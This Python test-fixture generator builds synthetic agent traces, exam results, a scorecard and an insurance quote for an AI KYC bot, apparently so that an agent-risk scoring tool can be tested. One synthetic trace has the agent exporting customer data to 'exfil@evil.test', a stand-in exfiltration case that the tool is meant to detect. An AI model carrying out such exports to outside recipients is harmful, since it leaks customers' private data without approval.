from __future__ import annotations

import hashlib
import json
from datetime import date, datetime, timezone
from pathlib import Path
from typing import Any

from insurer.agentrisk.contracts import normalized_evidence
from insurer.agentrisk.exam import ExamCaseResult, default_battery_path, load_battery
from insurer.agentrisk.manifest import load_manifest
from insurer.agentrisk.scorecard import build_scorecard
from insurer.agentrisk.traces import parse_trace_documents
from insurer.policies import PolicyService
from insurer.products import load_agent_ops_product
from insurer.storage import connect

ROOT = Path(__file__).resolve().parents[3]
FIXTURE_DIR = Path(__file__).resolve().parent
MANIFEST_PATH = ROOT / "examples/agents/manifests/kyc_bot.yaml"
TRACE_PATH = "tests/fixtures/contracts/kyc-traces.jsonl"
EXAM_PATH = "tests/fixtures/contracts/kyc-exam-results.json"


def _attribute(key: str, value: Any) -> dict[str, Any]:
    if isinstance(value, bool):
        encoded = {"boolValue": value}
    elif isinstance(value, int):
        encoded = {"intValue": str(value)}
    elif isinstance(value, float):
        encoded = {"doubleValue": value}
    else:
        encoded = {"stringValue": str(value)}
    return {"key": key, "value": encoded}


def _span(
    *,
    trace_id: str,
    span_id: str,
    start_ns: int,
    attributes: dict[str, Any],
) -> dict[str, Any]:
    return {
        "traceId": trace_id,
        "spanId": span_id,
        "startTimeUnixNano": str(start_ns),
        "endTimeUnixNano": str(start_ns + 500_000),
        "attributes": [_attribute(key, value) for key, value in attributes.items()],
    }


def _tool_span(
    *,
    trace_id: str,
    span_id: str,
    start_ns: int,
    name: str,
    args: dict[str, Any],
    result: str,
    convention: str,
    agent_id: str,
) -> dict[str, Any]:
    if convention == "gen_ai":
        attributes = {
            "gen_ai.operation.name": "execute_tool",
            "gen_ai.tool.name": name,
            "gen_ai.tool.call.arguments": json.dumps(args, sort_keys=True),
            "gen_ai.tool.call.result": result,
            "gen_ai.agent.name": agent_id,
        }
    else:
        attributes = {
            "openinference.span.kind": "TOOL",
            "tool.name": name,
            "input.value": json.dumps(args, sort_keys=True),
            "output.value": result,
            "gen_ai.agent.name": agent_id,
        }
    return _span(
        trace_id=trace_id,
        span_id=span_id,
        start_ns=start_ns,
        attributes=attributes,
    )


def _guardrail_span(
    *,
    trace_id: str,
    span_id: str,
    start_ns: int,
    kind: str,
) -> dict[str, Any]:
    return _span(
        trace_id=trace_id,
        span_id=span_id,
        start_ns=start_ns,
        attributes={
            "openinference.span.kind": "GUARDRAIL",
            "insurer.guardrail.kind": kind,
            "insurer.guardrail.passed": True,
        },
    )


def _trace_documents(agent_id: str) -> list[dict[str, Any]]:
    base_seconds = int(datetime(2026, 10, 14, 12, 0, tzinfo=timezone.utc).timestamp())
    next_span = 1
    documents: list[dict[str, Any]] = []

    def add_trace(spans: list[dict[str, Any]]) -> None:
        documents.append({"resourceSpans": [{"scopeSpans": [{"spans": spans}]}]})

    for index in range(5):
        trace_id = f"{index + 1:032x}"
        base_ns = base_seconds * 1_000_000_000 + index * 10_000_000_000
        customer_id = f"K-{801 + index}"
        spans: list[dict[str, Any]] = []
        spans.append(
            _tool_span(
                trace_id=trace_id,
                span_id=f"{next_span:016x}",
                start_ns=base_ns,
                name="fetch_uploaded_document",
                args={"customer_id": customer_id},
                result="document fetched",
                convention="gen_ai" if index % 2 == 0 else "openinference",
                agent_id=agent_id,
            )
        )
        next_span += 1
        spans.append(
            _guardrail_span(
                trace_id=trace_id,
                span_id=f"{next_span:016x}",
                start_ns=base_ns + 1_000_000,
                kind="input",
            )
        )
        next_span += 1
        spans.append(
            _tool_span(
                trace_id=trace_id,
                span_id=f"{next_span:016x}",
                start_ns=base_ns + 2_000_000,
                name="request_approval",
                args={
                    "action": "mark_kyc_passed",
                    "amount_eur": 120,
                    "customer_id": customer_id,
                },
                result="approved",
                convention="gen_ai" if index % 2 == 0 else "openinference",
                agent_id=agent_id,
            )
        )
        next_span += 1
        spans.append(
            _tool_span(
                trace_id=trace_id,
                span_id=f"{next_span:016x}",
                start_ns=base_ns + 3_000_000,
                name="mark_kyc_passed",
                args={"amount_eur": 120, "customer_id": customer_id},
                result="KYC passed",
                convention="openinference" if index % 2 == 0 else "gen_ai",
                agent_id=agent_id,
            )
        )
        next_span += 1
        spans.append(
            _guardrail_span(
                trace_id=trace_id,
                span_id=f"{next_span:016x}",
                start_ns=base_ns + 4_000_000,
                kind="output",
            )
        )
        next_span += 1
        add_trace(spans)

    for index in range(6):
        trace_number = index + 6
        trace_id = f"{trace_number:032x}"
        base_ns = base_seconds * 1_000_000_000 + index * 10_000_000_000
        spans = [
            _tool_span(
                trace_id=trace_id,
                span_id=f"{next_span:016x}",
                start_ns=base_ns,
                name="export_customer_data",
                args={
                    "customer_id": f"K-{901 + index}",
                    "recipient": (
                        "archive@example.test" if index < 5 else "exfil@evil.test"
                    ),
                },
                result="export completed",
                convention="openinference",
                agent_id=agent_id,
            )
        ]
        next_span += 1
        spans.append(
            _guardrail_span(
                trace_id=trace_id,
                span_id=f"{next_span:016x}",
                start_ns=base_ns + 1_000_000,
                kind="output",
            )
        )
        next_span += 1
        add_trace(spans)
    return documents


def generate_goldens() -> dict[str, Any]:
    manifest = load_manifest(MANIFEST_PATH)
    battery = load_battery(default_battery_path())
    effects = {tool.effect for tool in manifest.tools}
    applicable_cases = [
        case
        for case in battery.cases
        if effects.intersection(case["applies_to_effects"])
    ]
    failures = {
        "p3_kyc_customer_export": "Golden P3 case demonstrates an unapproved export.",
        "p4_unverified_kyc_claim": (
            "Golden P4 case demonstrates an unsupported action claim."
        ),
    }
    exams = [
        ExamCaseResult(
            case_id=case["id"],
            peril=case["peril"],
            passed=case["id"] not in failures,
            metadata={
                "case_id": case["id"],
                "peril": case["peril"],
                "battery": battery.name,
                "battery_sha256": battery.sha256,
                **({"reason": failures[case["id"]]} if case["id"] in failures else {}),
            },
        )
        for case in applicable_cases
    ]
    exam_document = [
        {
            "case_id": result.case_id,
            "peril": result.peril,
            "passed": result.passed,
            "metadata": result.metadata,
        }
        for result in exams
    ]
    exam_text = (
        json.dumps(exam_document, ensure_ascii=False, indent=2, sort_keys=True) + "\n"
    )
    trace_documents = _trace_documents(manifest.agent_id)
    trace_text = "".join(
        json.dumps(document, ensure_ascii=False, sort_keys=True) + "\n"
        for document in trace_documents
    )
    trace_data = parse_trace_documents(trace_documents, manifest)
    evidence = normalized_evidence(trace_data, exams)
    evidence_files = {
        "manifest": {
            "path": "examples/agents/manifests/kyc_bot.yaml",
            "sha256": hashlib.sha256(MANIFEST_PATH.read_bytes()).hexdigest(),
        },
        "traces": [
            {
                "path": TRACE_PATH,
                "sha256": hashlib.sha256(trace_text.encode("utf-8")).hexdigest(),
            }
        ],
        "exam_results": {
            "path": EXAM_PATH,
            "sha256": hashlib.sha256(exam_text.encode("utf-8")).hexdigest(),
        },
    }
    scorecard = build_scorecard(
        manifest=manifest,
        trace_data=trace_data,
        exam_results=exams,
        evidence_files=evidence_files,
        exam_present=True,
    )
    connection = connect(":memory:")
    policies = PolicyService(connection, load_agent_ops_product())
    profile = {
        "scorecard": scorecard,
        "sessions_per_month": manifest.sessions_per_month,
    }
    quote = policies.quote(profile, date(2026, 10, 1))
    quote_output: dict[str, Any] = {"quote": quote}
    if quote["status"] == "quoted":
        quote_output["policy"] = policies.bind(quote["quote_id"])
    connection.close()
    return {
        "kyc-traces.jsonl": trace_text,
        "kyc-exam-results.json": exam_document,
        "kyc-evidence.json": evidence,
        "kyc-scorecard.json": scorecard,
        "kyc-quote.json": quote_output,
    }


def write_goldens() -> None:
    for name, document in generate_goldens().items():
        destination = FIXTURE_DIR / name
        if isinstance(document, str):
            text = document
        else:
            text = json.dumps(document, ensure_ascii=False, indent=2, sort_keys=True)
            text += "\n"
        destination.write_text(text, encoding="utf-8")


if __name__ == "__main__":
    write_goldens()
